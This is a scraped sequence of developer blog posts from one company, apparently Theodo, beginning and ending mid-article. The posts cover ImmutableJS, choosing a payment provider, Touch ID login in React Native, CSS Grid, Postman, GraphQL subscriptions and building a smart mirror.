hero.abilities[weaknessIndex] // throws Error

const immutableWeaknessIndex = immutableHero.get('abilities').indexOf('weakness') // -1
immutableHero.get('abilities').get(weaknessIndex) // 'Super strength'

While you can use all the knowledge you have on javascript and ES6, if you go with ImmutableJS you’ll have to learn some things from the start.
Nicolas, a colleague of mine once came to me with a strange issue.
They were using normalizr and had a state that looked like the Immutable equivalent of this:
{
  fundState: {
    fundIds: // a list of fund ids
    fundsById: // an object with a fund id as key and the fund data as value: { fund1Id: fund1 },
  }
}

Their problem was that their ids, indexing funds in fundsById Map where strings of numbers and not numbers.
At least twice, one of their developers had a hard time writing a feature because they were trying to get the funds like this: state.get('fundState', 'fundsById', 3) to get the fund of id 3.
The issue here is that contrary to javascript, strings of numbers and numbers are not at all interchangeable (it may be a good thing but it is an important difference!).
So they had to convert all their id keys to the right type.
Another issue that colleagues shared with me was that ImmutableJS is really hard to debug in the console as shown below with our immutableHero object from above:

As you can see, it’s nearly unreadable and its only a really simple object!
A great solution I encountered when trying to help them is immutable formatter a chrome extension that turns what you saw into this beauty:

To enable it, you have to open chrome dev tools. Then access the dev tools settings and check “enable custom formatter” option:

In the case of ES6, new developers have three things to learn:

Understand why immutability is important and why they should bother
How to use spread operators to enforce immutability
Not to use object.key = value to modify their state

Conclusion for Learning Curve
Overall the learning curve for spread operators, an ES6 tool is rather easy since you can still use all the javascript you know and love but you must be careful to the points listed above.
ImmutableJS on the other hand will be much harder to learn and master.
Conclusion for Part 1
In conclusion, this first part showed us that ImmutableJS comes with a lot of nice things, allows you to concentrate on working on value added work rather than trying to read horrible reducers or looking for hidden bugs.
This of course is at the cost of the steeper learning curve of a rich API and some paradigms different from what you are used to!
In the part II of this article I will compare both solutions in the light of Performance and compatibility with typing.
If you liked this article and want to know more, follow me on twitter so you know when the second part is ready :).
@jeremy_dardour

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jérémy Dardour
  			
  				  			
  		
    
			

									"
"
										When deciding what external payment service you want to use, you need to take into account several factors: the price of the payment provider, the amount of time of implementation, the ease of customising and styling the form, the trust of users to the company … and see what is best suited for your needs. There is not one best online provider, but this article will help you chose one that fits you project.
At Theodo we use different online payment providers: SagePay, PayPal and Stripe for our websites. For each one of them we have discovered advantages and drawbacks, that I will share with you.
Keep in mind that using a payment provider such as one we are going to talk about allows to easily be PCI compliant, which is essential for any website dealing with card data.
Overall price
The overall price covers the development cost and the transaction fees. Additional costs for setup, refunding and breaking the contract may also apply.
Development cost:
Here is in order a comparison of the three payment providers we use:

1 – Stripe: ~1day. This “development first” payment provider is specially built for an easy integration to websites. Therefore it is no surprise that it is a good choice if you want to quickly handle payments. In our company we like to use it when building MVPs because it takes less than a day to integrate and design with Stripe Elements.
2 -PayPal express checkout: ~ 2/3 days. You can usePayPal Express Checkout on your website to allow your customers to proceed to aPayPal payment. This will momentarily redirect the client to the PayPal login page and then a summary page where he can pay he will then be sent back to your website. Integrating Paypal takes a couple of days.
3 – SagePay: ~ 1 week. Out of the three payment providers we use, this is definitely the one that takes the longest to integrate – all in all more than a week. You can use an iFrame to send the card data. However the documentation is not that clear and styling the form is complex (you need to send the styling files to SagePay that will then add them to the iFrame).

Fees per transaction:
The price depends on:

Number of transaction per month
Price per transaction you will charge
Debit or Credit card
…

From our experience we found that for websites selling lots of products at small prices (~10€) it is worth using SagePay. But if there is a smaller traffic and higher prices Stripe might be a better solution. In both casesPayPal tends to have higher fees.
Finally, companies often negotiate the price fees directly with the payment providers to get more interesting offers, but this can take some time.
Here is an example of what you would be paying to the different companies:
If your company sells 100 products a month at an average price of £40 (total of £4,000), these would be the prices:

Stripe: £81
SagePay: £103.5
PayPal: £136

But if your company sells 350 products a month at an average price of £10 (total of £3,500), these would be the prices:

Stripe: £136.5
SagePay: £93.05
PayPal: £171

Here are the fees that you can find on the 3 websites:

Stripe:

For VISA Mastercard and American Express:

1.4% + 25p / transaction for European cards
2.9% + 25p / transaction for non European cards


As they say on their website: ’No setup, monthly, or hidden fees’.
Over £20,000 per months you can negotiate for lower fees
https://stripe.com/gb/pricing


SagePay:

£19.90/month: 350 free transactions per month then 12p per transaction after
£45/month if max 500 free token purchases per month then 10p per transaction
If more than 3000 transactions per month you will need to contact Sagepey to get a corporate account
+ 2.09% for Mastercard or Visa credit cards + 40p for debit cards (fees a quite hidden)
Cancelation fees can be high, a minimum of 3 months notice is necessary.
https://www.sagepay.co.uk/our-payment-solutions/online-payments


PayPal:

Less than £1500/month: 3.4% + 20p per transaction
Less than £6000/month: 2.9% + 20p per transaction
Less than £15,000/month: 2.4% + 20p per transaction
Less than £55,000/month: 1.9% + 20p per transaction
More: personalised amount
https://www.paypal.com/uk/webapps/mpp/paypal-fees



Website Integration / design
The design of the form is very important. Users probably will not trust a website with cheap design. Also, paying is not the most pleasant moment of a customer’s journey. A seamless flow should be a must-have to get customers to pay and come back. Do not underestimate the design of your form!

Stripe: you can easily style the different inputs so the payment is consistent with the rest of your website. This is something we really appreciate with Stripe Elements.
PayPal: as the payment is done directly onPayPal website you won’t have any design to do! Users would find this option reassuring because they know how there money is being processed.
SagePay: it is difficult to get a flawless and consistent design, as you have to send files to SagePay so they can handle the iFrame styling.

What we recommend
If you wish to add a payment method to your website for the first time and that the project is short, we would recommend Stripe. As it is really easy to integrate and style it is perfect for these projects. If your website has a lot of traffic, SagePay is a good choice because of its low fees with a lot of transactions. However keep in mind that the implementation can take time. Finally it is a nice option to add aPayPal button on top of your existing payment methods as some customers are reluctant to input the card details on websites.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Alice Breton
  			
  				  			
  		
    
			

									"
"
										Most modern smart phones have a built-in fingerprint sensor.
On iOS, this feature is called Touch ID whereas on Android, it is generally referred to as “Fingerprint Authentication”.
People most commonly use it to unlock their device by simply pressing their finger on the fingerprint sensor.

It is a cool technology and as a React-Native developer you can actually integrate Touch ID* into your apps by using the react-native-touch-id library.
[*I will refer to this feature as “Touch ID” for the rest of the article. But everything here applies to both iOS and Android unless stated otherwise.]
There are various use cases for Touch ID and they generally fall within one of two categories:

Increase the security of your app

This is commonly done by adding a Touch ID lock.
Popular examples are Dropbox, Outlook, Revolut and LastPass


Make your app more user-friendly

The most common use case in this category is the Touch ID login
This is very popular in banking apps such as HSBC, Barclays and Halifax



You can use the diagram below to decide how you should use Touch ID in your app:

In this article, I will explain how to add Touch ID to your React Native app and how you can implement a Touch ID Lock or Touch ID Login.
Authentication with Touch ID
There is an excellent library called react-native-touch-id that lets you easily prompt your users for Touch ID authentication.
Before you can use it, you need to install and link the library:
yarn add react-native-touch-id            # Install the JS package
react-native link react-native-touch-id   # Link the library

Once that is done, you can prompt the user to authenticate with Touch ID:
import TouchID from 'react-native-touch-id';

TouchID.authenticate('Authenticate with fingerprint') // Show the Touch ID prompt
  .then(success => {
    // Touch ID authentication was successful!
    // Handle the successs case now
  })
  .catch(error => {
    // Touch ID Authentication failed (or there was an error)!
    // Also triggered if the user cancels the Touch ID prompt
    // On iOS and some Android versions, `error.message` will tell you what went wrong
  });

The code above will trigger the following prompt:

The TouchID library contains one more method, called isSupported.
As the name suggests, it allows you to check if the user’s device supports Touch ID.
No matter which use case you decide on, you will want to make this check before you ask your user to authenticate with Touch ID:
import TouchID from 'react-native-touch-id';

TouchID.isSupported()
  .then(biometryType => {
    if (biometryType === 'TouchID') {
      // Touch ID is supported on iOS
    } else if (biometryType === 'FaceID') {
      // Face ID is supported on iOS
    } else if (biometryType === true) {
      // Touch ID is supported on Android
    }
  })
  .catch(error => {
    // User's device does not support Touch ID (or Face ID)
    // This case is also triggered if users have not enabled Touch ID on their device
  });

Note for iPhone X: On iOS, react-native-touch-id actually supports both Touch ID and Face ID.
When you call TouchID.authenticate, the library will figure out which authentication method to use and show the correct prompt to the user.
It makes no difference in the way you use the library.
However, you should make sure to adjust the language of your app.
Don’t say “Touch ID” when you actually mean “Face ID”.
You can use the TouchID.isSupported method to get the correct biometry type for your iOS users.
When not to use Touch ID
Touch ID is a great addition for most apps.
But there cases in which it doesn’t really make sense to add Touch ID.
Generally speaking, if your app has no notion of user accounts, then you will have a hard time finding a good use for Touch ID.
Without user accounts, there is usually nothing private on the app that would benefit from protection.
Touch ID Lock: Make your app more secure
The Touch ID lock is the most popular use of Touch ID in modern apps:

Whenever the app is opened, the user is presented with a lock screen and asked to authenticate via Touch ID.
Only if authentication is successful will the user gain access to the app.
This is a great way to integrate Touch ID in your app.
Your users get a whole layer of additional security and the cost in user experience is minimal.
Adding a Touch ID lock makes the most sense if

your users have to sign in to use the app (and there is something worth protecting)
your users remain signed in (otherwise there is no real security gain)

Implementing the Touch ID lock
Adding the actual Touch ID authentication layer is simple.
You could create a Lock component that wraps around your app:
import React from 'react';
import TouchID from 'react-native-touch-id';
import App from './App';
import Fallback from './Fallback';

class Lock extends React.PureComponent {
  state = { locked: true };

  componentDidMount() {
    TouchID.authenticate('Unlock with your fingerprint').then(success =>
      this.setState({ locked: false }),
    );
  }

  render() {
    if (this.state.locked) {
      return <Fallback />;
    }

    return <App />;
  }
}

This component prompts the Touch ID authentication as soon as it mounts.
If authentication is successful, it renders your app (“unlocking” it).
If authentication is not successful, it renders a fallback component.
And handling the fallback is where the actual complexity of the Touch ID lock lies.
Handling the fallback
What happens if Touch ID no longer works for your user?
This could be due to something simple like wet fingers.
Or it could be that the fingerprint sensor in your users device has broken.
If you don’t handle the fallback correctly, your users will be locked out of your app.
The most popular option for handling the fallback is actually inspired by the iOS lock screen itself: a passcode lock.

Passcodes are still relatively quick to unlock for your user, and they do a good job of keeping the app secure.
I haven’t been able to find a good library for adding a passcode input.
But you might prefer to implement your own UI components anyway.
Where should you store the user’s passcode?
The simplest option would be to store the passcode on the users device itself.
I would recommend against using React Native’s built-in Async Storage.
It does not encrypt your data and anyone with access to the physical device will be able to read the code in plaintext.
Instead, I recommend using react-native-keychain which allows you to store credentials in your phone’s secure storage (the “keychain” in iOS and the “keystore” on Android).
Handling the fallback of the fallback
What happens if your user forgets the passcode?
The simplest solution is the one used by Dropbox: Users are logged out if they enter a wrong passcode 10 times in a row.
Touch ID Login: Make your app more user-friendly
Another popular use of Touch ID is the Touch ID login.

Users are prompted to authenticate with their fingerprint, and if authentication is successful, they get logged into the app.
This use case makes most sense if your users do not remain signed in and have to log in every time they open the app.
Therefore, you see this often being used in banking apps.
Implementing the Touch ID Login
There are three steps to implementing the Touch ID Login:

Store the user’s login credentials on the device
Prompt the user to authenticate with Touch ID on the login screen
If Touch ID authentication is successful, use the stored credentials to perform the login call behind the scenes

First time users will have to manually sign into the app.
During the initial sign in, you can store the user’s credentials in the secure storage of the device.
Again, do not use React-Native’s built-in Async Storage.
This is even more critical for the Touch ID login because it would be storing the user’s password in cleartext.
To store the user’s credentials securely, you should use react-native-keychain.
First, you need to install it:
yarn add react-native-keychain            # Install the JS package
react-native link react-native-keychain   # Link the library

You can then store the credentials in the keychain when the user logs in:
import * as Keychain from 'react-native-keychain';
import { login } from './api';

// Submission handler of the login form
handleSubmit = () => {
  const {
    username,               // Get the credentials entered by the user
    password,               // (We're assuming you are using controlled form inputs here)
    shouldEnableTouchID,    // Did you ask the user if they want to enable Touch ID login ?
  } = this.state;

  login(username, password) // call the `login` api
    .then(() => {
      if (shouldEnableTouchID) {
        // if login is successful and users want to enable Touch ID login
        Keychain.setGenericPassword(username, password); // store the credentials in the keychain
      }
    });
};

Next time the user lands on the login screen, you can present them with the Touch ID authentication prompt.
For example, you could add a button on the login form that allows users to login via Touch ID.

If the fingerprint authentication is successful, you can retrieve the credentials from the keychain and use them to make the login request.
The actual Touch ID login will look similar to this:
import * as Keychain from 'react-native-keychain';
import { login } from './api';

handlePress = () => {              // User presses the ""Login using Touch ID"" button

  Keychain.getGenericPassword()   // Retrieve the credentials from the keychain
    .then(credentials => {
      const { username, password } = credentials;

      // Prompt the user to authenticate with Touch ID.
      // You can display the username in the prompt
      TouchID.authenticate(`to login with username ""${username}""`)   
        .then(() => {

          // If Touch ID authentication is successful, call the `login` api
          login(username, password)
            .then(() => {
              // Handle login success
            })
            .catch(error => {
              if (error === 'INVALID_CREDENTIALS') {
                // The keychain contained invalid credentials :(
                // We need to clear the keychain and the user will have to sign in manually
                Keychain.resetGenericPassword();
              }
            })
        });
    });
};

Handling Invalid Credentials
Unlike the Touch ID Lock, you do not need to worry about implementing a fallback for the Touch ID Login, since you can just use the manual sign in.
However, you do need to worry about making sure that the keychain never contains invalid credentials.
Otherwise, your user might keep retrying to login via Touch ID using the wrong credentials.
In the worst case, you may end up disabling your user’s account due to too many failed login attempts.
Unfortunately, there is no guarantee that your keychain will always contain valid credentials.
Sometimes, users change or reset their credentials.
And if the username or password is changed on a different device, your keychain will end up containing invalid credentials.
If you realise that the keychain does contain invalid credentials, you must clear the keychain and turn off Touch ID.
To clear the keychain, call the Keychain.resetGenericPassword() function.
This means that your user will have to sign in manually.
However, once the manual login is successful, you can directly update the keychain with the provided credentials and the next login will quick and painless thanks to the Touch ID.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Brian Azizi
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Why did I stop using Bootstrap?

Bootstrap is too verbose: you need plenty of div even if you only have a couple of blocks in your layout
Things get even worse when you add responsiveness…
… or when you want to move your blocks around
Bootstrap’s grids are limited to 12 columns
By default, Bootstrap has 10-pixel paddings that are complex to override
Bootstrap has to be downloaded by the users, which slows down your website

How to create a layout for your website without Bootstrap
Let’s say you have the following layout that you want to integrate:

What it would be like with Bootstrap
<body>
  <div class=""container"">
    <div class=""row"">
      <div class=""col-12 header"">...</div>
    </div>
    <div class=""row"">
      <div class=""col-4 navigation-menu"">...</div>
      <div class=""col-8 main-content"">...</div>
    </div>
    <div class=""row"">
      <div class=""col-12 footer"">...</div>
    </div>
  </div>
</body>
Even though there are only four blocks, you needed nine different div to code your layout.
How much simpler it would be with CSS Grid
Thanks to CSS Grid, you can get the same result with only five div!
<body>
  <div class=""container"">
    <div class=""header"">...</div>
    <div class=""navigation-menu"">...</div>
    <div class=""main-content"">...</div>
    <div class=""footer"">...</div>
  </div>
</body>
Though it will not be as simple as just importing Bootstrap, you will have to add some extra CSS.
.container {
  display: grid;
  grid-template-columns: repeat(12, 1fr);
}
.header {
  grid-column: span 12;
}
.navigation-menu {
  grid-column: span 4;
}
.main-content {
  grid-column: span 8;
}
.footer {
  grid-column: span 12;
}
In the example above, you first defined the container as a 12-column grid.
And then, you set the number of tracks the item will pass through.
What about responsiveness?
Moreover you may want to have a responsive layout for smartphones and tablets.

With Bootstrap
As the design gets more complex, your HTML also gets more complex with more and more classes:
<body>
  <div class=""container"">
    <div class=""row"">
      <div class=""col-xs-12 header"">...</div>
    </div>
    <div class=""row"">
      <div class=""col-xs-12 col-md-6 col-lg-4 navigation-menu"">...</div>
      <div class=""col-xs-12 col-md-6 col-lg-8 main-content"">...</div>
    </div>
    <div class=""row"">
      <div class=""col-xs-12 footer"">...</div>
    </div>
  </div>
</body>
With CSS Grid
With CSS Grid, if you want to add responsiveness to your layout, there is no need to change the HTML.
You only need to add some media queries to our CSS stylesheet:
...
@media screen and (max-width: 768px) {
  .navigation-menu {
    grid-column: span 6;
  }
  .main-content {
    grid-column: span 6;
  }
}
@media screen and (max-width: 480px) {
  .navigation-menu {
    grid-column: span 12;
  }
  .main-content {
    grid-column: span 12;
  }
}

What if you wanted to move your blocks around?
Let’s say that instead of the above layout on mobile, you wanted the navigation menu to be above the header:

With Bootstrap
You would have had to duplicate your menu, hide one and display the other on mobile and vice versa on desktop:
<body>
  <div class=""container"">
    <div class=""row"">
      <div class=""col-xs-12 hidden-sm-up navigation-menu-mobile"">...</div>
      <div class=""col-xs-12 header"">...</div>
    </div>
    <div class=""row"">
      <div class=""col-md-6 col-lg-4 hidden-xs-down navigation-menu"">...</div>
      <div class=""col-xs-12 col-md-6 col-lg-8 main-content"">...</div>
    </div>
    <div class=""row"">
      <div class=""col-xs-12 footer"">...</div>
    </div>
  </div>
</body>
And the HTML gets more and more complex as your layout grows.
With CSS Grid
You only need one single line of CSS to move the navigation menu to the top on mobile and here is how to do so:
...
@media screen and (max-width: 480px) {
  .navigation-menu {
    grid-row: 1;
    grid-column: span 12;
  }
  ...
}

Customize your grid layout!
Have as many or as few columns as you want
By default, Bootstrap comes with a 12-column grid system.
This value can be overridden but if you do so, it will be overridden everywhere in your app.
On the other hand, with CSS Grid, you can specify the number of columns per row for each of your grids.
In grid-template-columns: repeat(12, 1fr);, you can just set the number of columns you want instead of 12.
Unwanted 10-pixel paddings
Bootstrap’s columns have 10-pixel paddings on their right and left.
The most advised solution to override them is to use padding-right: 0 !important; and padding-left: 0 !important;.
As with CSS Grid you have control over all your CSS classes, you can set the paddings you want everywhere.
No more need to download any library
Even if Bootstrap’s stylesheet only weights a few kB, it still slows down the loading of your page.
All major browsers shipped their implementation of CSS Grid in 2017, so there is no need to download any extra CSS to use CSS Grid!
At the time of this article (April 2018), 89% of browsers are compatible with CSS Grid.

That’s all for now!
Here are some of the main reasons why I no longer use Bootstrap.
Part 2 on how I also managed to replace Flexbox with CSS Grid is coming!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Cédric Kui
  			
  				I enjoy browsing cat and panda GIFs while drinking tea. Oh, I am also a Web Developer at Theodo  			
  		
    
			

									"
"
										 
A postman, or letter carrier (in American English), sometimes colloquially known as a postie, is an employee of a post office or postal service, who delivers mail and parcel post to residences and businesses. Postman is also the name of a powerful graphical HTTP client helpful when working with APIs. I’ll introduce a few tricks to get started with it!
Installation
To install Postman, go to this link and download the right version for the OS you use.
How to do a simple GET?
Launching the app, you should see the following screen:

Click the Request button at the top-left of the modal, and you’ll get on the Save Request screen.
Give it a name, create a collection if you don’t have any, select a collection and save it.

From there, you’ll be able to send a request. For exemple, you can hit the HTTPCat API. Enter the https://http.cat/[status_code] URL in the dedicated tab, with the status code of your choice. Press Send and you’ll see the response just below.

A first POST with a JSON body
To illustrate how to do a POST request, we are going to hit the https://jsonplaceholder.typicode.com/ URL, on the post route.
So from the same screen, select POST instead of GET, and enter the URL in the dedicated tab.

The API we’re hitting enables us to send any JSON body, and sends it back in the response, adding it an id. Let’s then send a random object.
Go in the Body tab, check the raw radio button, and make sure that you selected JSON (application/json) on the dropdown on the right.
The body is a JSON object. There are a couple of things we need to be careful of when we write a JSON object, especially when you are used to writing JavaScript. Check here to know the traps not to fall in.
In the end we obtain this kind of POST requests:

Just press Send and you’ll have the response!
Useful tricks POSTMAN offers
How to share one’s collections
Export them
On the left of your window, you have a list of your collections. Go over one with your mouse cursor, and you’ll see three dots on the bottom-right of it. Click them, then click Export.

You’ll get on a modal that asks you to choose the way you want to download your collection. Choose Collection v2, click Export and save it.

Import them
To import a collection, click on Import at the top-right of your window, then get in your own files the json you want to import!

How to set environnement variables
The typical use case here is when you work with different environments. Let’s say you develop an API which has a production, a staging and a development environments. For each of them, you want to set a Host and a token variable, to be able to authenticate.
Click the wheel on the top-right of your screen, then select Manage Environments.

Click Add.

You can now give a name to your environment, and set the variables you need. Click Update when this is done.

You can do this for each one of your environments, then you’ll see them in the Manage Environments tab.

Now go back to the main screen, and fill your request with the variables using double curly brackets: {{ }}.

Best way to create a request: copy as curl
Let’s say you want to reproduce a request done on a website. But this request is a very tricky one with, for example, authentication, complicated headers, a big body or a method you don’t really know how to use.
Then the best way to replicate this request is to basically copy the entire request directly from your browser.
Let’s say we want to get the post request of a research on https://giphy.com/. Open the browser development tools (Right click + Inspect on Chrome). Go in the Network tab and filter the requests by POST methods. Right click the one you are interested in, and select Copy as CURL.

Now, go back to POSTMAN. On the top-left, click Import, and go in the Paste Raw Text tab. Paste what you copied, and press Import.

Now Send the request and you’ll have the answer!
Conclusion
If you want to keep going with Postman, you check this article about Postman Cloud, which explains you how to share and document your API.
And actually there were technically only 4 tricks in this article.. If you find any fifth that would fit here, send it to me and I’ll add it!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Elias Tounzal
  			
  				  			
  		
    
			

									"
"
										Real-time has opened new opportunities in web applications.
By allowing users to get access to data as soon as it’s available, it provides them a better experience.
Thanks to real-time, you can edit documents collaboratively, play online with your friends, know exactly when your pizza delivery man will arrive or when you will arrive at destination depending of the current traffic.
In the past, implementing real-time had a huge cost and was reserved for top companies like Google or Facebook, but nowadays, emergence of real-time technologies and libraries makes it accessible to anyone.
GraphQL has integrated real-time in its specification with Subscriptions. That means that you can use real-time inside the same api you use for the rest of your application, providing an unique source of communication and a better organization.
In this tutorial, you will see how to implement a real-time web application with few lines of codes, using GraphQL, Apollo and React.
In order to accomplish this goal, we will build a notification system from scratch in two parts, first we will implement a GraphQL NodeJS express server, then a web application with React.
The code referring to this article can be found on GitHub.
1. The server
1.1. Bootstrap the GraphQL server
Let’s start with the initiation of the server.
Create a new folder and write the following commands inside:

npm init or yarn init to generate the package.json file
npm install --save express body-parser apollo-server-express graphql-tools or yarn add express body-parser apollo-server-express graphql-tools to install required libraries.

Create a new file index.js:
const express = require('express');
const bodyParser = require('body-parser');
const { graphqlExpress, graphiqlExpress } = require('apollo-server-express');
const { makeExecutableSchema } = require('graphql-tools');

const notifications = [];
const typeDefs = `
  type Query { notifications: [Notification] }
  type Notification { label: String }
`;
const resolvers = {
  Query: { notifications: () => notifications },
};
const schema = makeExecutableSchema({ typeDefs, resolvers });

const app = express();
app.use('/graphql', bodyParser.json(), graphqlExpress({ schema }));
app.use('/graphiql', graphiqlExpress({ endpointURL: '/graphql' }));
app.listen(4000, () => {
  console.log('Go to http://localhost:4000/graphiql to run queries!');
});

Congratulations, you have just created a GraphQL server with Express and Apollo!
You can launch it with the command: node index.js.
In this server, we added a GraphQL query named notifications that allows us to get all notifications.
You can test it with GraphiQL, by going to the adress http://localhost:4000/graphiql and sending the following query (it should return an empty array because there is no notifications available yet):
query {
  notifications {
    label
  }
}

The corresponding commit is available here.
1.2. Add a mutation to the server
Next, let’s add a mutation that will allow you to push notifications.
Update type definitions and resolvers in index.js:
...
const typeDefs = `
  type Query { notifications: [Notification] }
  type Notification { label: String }
  type Mutation { pushNotification(label: String!): Notification }
`;
const resolvers = {
  Query: { notifications: () => notifications },
  Mutation: {
      pushNotification: (root, args) => {
        const newNotification = { label: args.label };
        notifications.push(newNotification);

        return newNotification;
      },
  },
};
...

The pushNotification mutation is ready. You can test it in GraphiQL, with:
mutation {
  pushNotification(label:""My first notification"") {
    label
  }
}

Click here for the commit.
1.3. Add subscriptions
The last step in the building of the server is adding the subscription, to make our server going to real-time.
Add the required libraries to use subscriptions: npm install --save graphql-subscriptions http subscriptions-transport-ws cors or yarn add graphql-subscriptions http subscriptions-transport-ws cors
Then add the subscription newNotification in the GraphQL schema:
const { PubSub } = require('graphql-subscriptions');

const pubsub = new PubSub();
const NOTIFICATION_SUBSCRIPTION_TOPIC = 'newNotifications';
...
  type Mutation { pushNotification(label: String!): Notification }
  type Subscription { newNotification: Notification }
...
const resolvers = {
  Query: { notifications: () => notifications },
  Mutation: {
      pushNotification: (root, args) => {
        const newNotification = { label: args.label };
        notifications.push(newNotification);

        pubsub.publish(NOTIFICATION_SUBSCRIPTION_TOPIC, { newNotification });
        return newNotification;
      },
  },
  Subscription: {
    newNotification: {
      subscribe: () => pubsub.asyncIterator(NOTIFICATION_SUBSCRIPTION_TOPIC)
    }
  },
};
const schema = makeExecutableSchema({ typeDefs, resolvers });


Declare a PubSub and a topic corresponding to the new Subscription
Declare the type definition of the new Subscription called newNotification
Every time a new notification is sent via the pushNotification mutation, publish to PubSub with the relevant topic
Sync the new notification Subscription with all events from PubSub instance corresponding to relevant topic

Finally, update the server configuration to provide Subscriptions via WebSockets.
const cors = require('cors');
const { execute, subscribe } = require('graphql');
const { createServer } = require('http');
const { SubscriptionServer } = require('subscriptions-transport-ws');
...
const app = express();
app.use('*', cors({ origin: `http://localhost:3000` })); // allows request from webapp
app.use('/graphql', bodyParser.json(), graphqlExpress({ schema }));
app.use('/graphiql', graphiqlExpress({
  endpointURL: '/graphql',
  subscriptionsEndpoint: `ws://localhost:4000/subscriptions`
}));
const ws = createServer(app);
ws.listen(4000, () => {
  console.log('Go to http://localhost:4000/graphiql to run queries!');

  new SubscriptionServer({
    execute,
    subscribe,
    schema
  }, {
    server: ws,
    path: '/subscriptions',
  });
});

The server is ready, you can test the new Subscription with GraphiQL.
Use the following query to display new notifications on a windows.
subscription {
  newNotification {
    label
  }
}

And in another windows, if you push notifications via the mutation created before, you should see data from the subscription being updated.

You can find the relevant commit here
2. The React web application
2.1. Bootstrap the React app
Bootstrap the front-end application with Create React App:
npx create-react-app frontend
Corresponding commit here
2.2. Add mutation to push notifications
Next, we will set up Apollo Client to communicate with the GraphQL server.
Install the required libraries: npm install --save apollo-boost react-apollo graphql or yarn add apollo-boost react-apollo graphql
Update index.js
...
import { ApolloProvider } from 'react-apollo'
import { ApolloClient } from 'apollo-client'
import { HttpLink } from 'apollo-link-http'
import { InMemoryCache } from 'apollo-cache-inmemory'

const client = new ApolloClient({
  link: new HttpLink({ uri: 'http://localhost:4000/graphql' }),
  cache: new InMemoryCache()
})

ReactDOM.render(
  <ApolloProvider client={client}>
    <App />
  </ApolloProvider>,
  document.getElementById('root')
);

Then create a new component PushNotification that will be used to send pushNotification mutation.
PushNotification.js
import React, { Component } from 'react'
import { graphql } from 'react-apollo'
import gql from 'graphql-tag'

class PushNotification extends Component {
  state = { label: '' }

  render() {
    return (
      <div>
        <input
          value={this.state.label}
          onChange={e => this.setState({ label: e.target.value })}
          type=""text""
          placeholder=""A label""
        />
        <button onClick={() => this._pushNotification()}>Submit</button>
      </div>
    )
  }

  _pushNotification = async () => {
    const { label } = this.state
    await this.props.pushNotificationMutation({
      variables: {
        label
      }
    })
    this.setState({ label: '' });
  }
}

const POST_MUTATION = gql`
mutation PushNotificationMutation($label: String!){
  pushNotification(label: $label) {
    label
  }
}
`

export default graphql(POST_MUTATION, { name: 'pushNotificationMutation' })(PushNotification)


As the component is wrapped by graphql(POST_MUTATION, { name: 'pushNotificationMutation' })(PushNotification), this component has a prop pushNotification that can be used to call the mutation.

Then call PushNotification in AppComponent
import PushNotification from 'PushNotification'
...
  <div className=""App-intro"">
    <PushNotification/>
  </div>
...

We can now push notifications from the React application! We can check that notifications are sent to the server with GraphiQL.
Corresponding commit is here
2.3. Add subscription to get real-time notifications
The last step is allowing subscriptions in the React application.
Install the required dependencies: npm install --save apollo-link-ws react-toastify or yarn add apollo-link-ws react-toastify.

apollo-link-ws enables to send GraphQL operation over WebSockets.
React Toastify will be used to push toasts when a notification is received

Then update Apollo Client configuration to use WebSockets
index.js
...
import { split } from 'apollo-link';
import { WebSocketLink } from 'apollo-link-ws';
import { getMainDefinition } from 'apollo-utilities';

const httpLink = new HttpLink({ uri: 'http://localhost:4000/graphql' });

const wsLink = new WebSocketLink({
  uri: `ws://localhost:4000/subscriptions`,
  options: {
    reconnect: true
  }
});

const link = split(
  ({ query }) => {
    const { kind, operation } = getMainDefinition(query);
    return kind === 'OperationDefinition' && operation === 'subscription';
  },
  wsLink,
  httpLink,
);

const client = new ApolloClient({
  link,
  cache: new InMemoryCache()
})
...

And wrap the main App component with the query corresponding to the subscription.
import { graphql } from 'react-apollo'
import gql from 'graphql-tag'
import { ToastContainer, toast } from 'react-toastify';

class App extends Component {
  componentWillReceiveProps({ data: { newNotification: { label } } }) {
    toast(label);
  }
  render() {
    return (
      <div className=""App"">
        ...
        <ToastContainer />
      </div>
    );
  }
}

const subNewNotification = gql`
  subscription {
    newNotification {
      label
    }
  }
`;

export default graphql(subNewNotification)(App);


When a component is wrapped with a Subscription, it automatically receives data from the subscription in its props.
Another method to receive data from Subscription is using subscribeToMore. This useful method merges the different received objects in your component state with other objects from classic GraphQL queries.

The notification system is now finished!

Final commit here
Conclusion
During this tutorial, we learnt how to build a real-time notification system from scratch with GraphQL, Apollo and express.
The current system is basic, next step could be adding authentification to push notification only to a specific user.
To go further, I highly recommend:

How to GraphQL
Apollo Docs

Don’t hesitate to give feedback, or share your experiences with real-time GraphQL in comments.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Loïc Carbonne
  			
  				Agile Web Developer at Theodo  			
  		
    
			

									"
"
										Smart mirrors are straight from science fiction but it turns out that building your own smart mirror isnt just science fiction or Tom Cruise’s favorite activity. Its actually easy to build your own version… and I will show you how.
I recently built one to save time each morning by answering this question:
Should I check for a bike for hire or take the subway?
Thus, I wanted to have several pieces of information instantly such as weather conditions or the number of available bikes around my house.

Supplies
Here’s what you need:

ARaspberry Pi Zero W, or another Raspberry version with Wifi option (10€)
A monitor with HDMI-in, I have chosen an old laptop LCD screen (free)
LCD driver board (19€)
A two-way glass mirror (20€)
A frame for the mirror,  I found an old one in my garage (free)

Building your smart mirror is surprisingly easy
A smart mirror consists basically of a mirror with a screen attached to it that displays a static web page filled with all the data you want to show. 


(source: https://magicmirror.builders/)
One of the most expensive parts of building a smart mirror can be shelling out for a nice two-way mirror. Therefore, a lot of people have been experimenting with building a smart mirror with two-way mirror film on top of regular glass/plastic instead of actual two-way glass, as I did.

Raspberry configuration
Once you put all the parts together, you will have to set up your Raspberry Pi:
Install Raspbian Jessie OS
You can follow this tutorial here:
